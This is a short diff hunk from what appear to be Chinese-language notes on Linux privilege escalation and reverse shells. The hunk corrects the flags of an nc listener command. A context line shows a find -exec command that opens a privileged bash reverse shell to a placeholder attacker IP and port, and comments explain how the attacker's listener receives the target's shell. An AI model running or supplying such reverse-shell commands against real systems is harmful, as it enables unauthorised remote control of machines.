@@ -27,7 +27,7 @@ find /etc/shadow -exec bash -i >&  /dev/tcp/IP/PORT 0>&1 -p \;
 tty(Teletypewriter)
 //指Linux和Unix系统中，允许用户与内核操作(系统交互)之间的Socket。负责处理命令和字节流的传输以实现操控。
 
-nc -lvpn <PORT>
+nc -lvnp <PORT>
 //进行监听，在攻击机在监听本地<PORT>端口的同时，实际上这个端口已经成为了TCP Socket。那么此时nc将监听到目标机
 bash的标准输出和标准错误输出
 
